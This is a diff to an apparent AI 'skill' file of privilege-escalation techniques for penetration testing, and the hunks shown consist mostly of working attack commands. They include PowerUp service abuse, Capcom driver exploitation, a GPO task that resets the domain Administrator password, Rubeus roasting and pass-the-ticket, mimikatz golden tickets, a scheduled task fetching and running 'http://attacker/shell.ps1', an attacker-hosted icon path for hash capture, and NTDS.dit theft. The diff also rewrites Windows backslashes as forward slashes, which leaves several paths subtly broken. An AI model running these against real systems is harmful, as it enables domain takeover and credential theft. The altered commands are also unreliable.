@@ -1,6 +1,6 @@
 ---
 name: privilege-escalation-methods
-description: "Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations."
+description: Provide comprehensive techniques for escalating privileges from a low-privileged user to root/administrator access on compromised Linux and Windows systems. Essential for penetration testing post-exploitation phase and red team operations. Use when the task involves privilege escalation methods.
 risk: unknown
 source: community
 author: zebbern
@@ -127,31 +127,31 @@ SharpImpersonation.exe user:<user> technique:ImpersonateLoggedOnuser
 
 ```powershell
 # Using PowerUp
-. .\PowerUp.ps1
-Invoke-ServiceAbuse -Name 'vds' -UserName 'domain\user1'
-Invoke-ServiceAbuse -Name 'browser' -UserName 'domain\user1'
+. ./PowerUp.ps1
+Invoke-ServiceAbuse -Name 'vds' -UserName 'domain/user1'
+Invoke-ServiceAbuse -Name 'browser' -UserName 'domain/user1'
 ```
 
 #### 3. Abusing SeBackupPrivilege
 
 ```powershell
-import-module .\SeBackupPrivilegeUtils.dll
-import-module .\SeBackupPrivilegeCmdLets.dll
-Copy-FileSebackupPrivilege z:\Windows\NTDS\ntds.dit C:\temp\ntds.dit
+import-module ./SeBackupPrivilegeUtils.dll
+import-module ./SeBackupPrivilegeCmdLets.dll
+Copy-FileSebackupPrivilege z:/Windows/NTDS/ntds.dit C:/temp/ntds.dit
 ```
 
 #### 4. Abusing SeLoadDriverPrivilege
 
 ```powershell
 # Load vulnerable Capcom driver
-.\eoploaddriver.exe System\CurrentControlSet\MyService C:\test\capcom.sys
-.\ExploitCapcom.exe
+./eoploaddriver.exe System/CurrentControlSet/MyService C:/test/capcom.sys
+./ExploitCapcom.exe
 ```
 
 #### 5. Abusing GPO
 
 ```powershell
-.\SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
+./SharpGPOAbuse.exe --AddComputerTask --Taskname "Update" `
   --Author DOMAIN\<USER> --Command "cmd.exe" `
   --Arguments "/c net user Administrator Password!@# /domain" `
   --GPOName "ADDITIONAL DC CONFIGURATION"
@@ -174,7 +174,7 @@ crackmapexec ldap 10.0.2.11 -u 'user' -p 'pass' --kdcHost 10.0.2.11 --kerberoast
 #### 2. AS-REP Roasting
 
 ```powershell
-.\Rubeus.exe asreproast
+./Rubeus.exe asreproast
 ```
 
 #### 3. Golden Ticket
@@ -191,7 +191,7 @@ mimikatz# kerberos::golden /user:Administrator /domain:domain.local `
 #### 4. Pass-the-Ticket
 
 ```powershell
-.\Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
+./Rubeus.exe asktgt /user:USER$ /rc4:<NTLM_HASH> /ptt
 klist  # Verify ticket
 ```
 
@@ -208,7 +208,7 @@ mimikatz# kerberos::golden /user:Administrator /rc4:<HASH> `
   /domain:DOMAIN /sid:<SID> /ticket:ticket.kirbi
 
 # 3. Create scheduled task
-schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority\SYSTEM" `
+schtasks /create /S DOMAIN /SC Weekly /RU "NT Authority/SYSTEM" `
   /TN "enterprise" /TR "powershell.exe -c 'iex (iwr http://attacker/shell.ps1)'"
 schtasks /run /s DOMAIN /TN "enterprise"
 ```
@@ -227,7 +227,7 @@ responder -I eth1 -v
 [InternetShortcut]
 URL=https://facebook.com
 IconIndex=0
-IconFile=\\attacker_ip\not_found.ico
+IconFile=\\attacker_ip/not_found.ico
 ```
 
 #### NTLM Relay
@@ -241,8 +241,8 @@ ntlmrelayx.py -tf targets.txt -smb2support
 
 ```powershell
 vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\temp\
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\temp\
+copy \\?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/NTDS/NTDS.dit C:/temp\
+copy \\?/GLOBALROOT/Device/HarddiskVolumeShadowCopy1/Windows/System32/config/SYSTEM C:/temp\
 ```
 
 ---
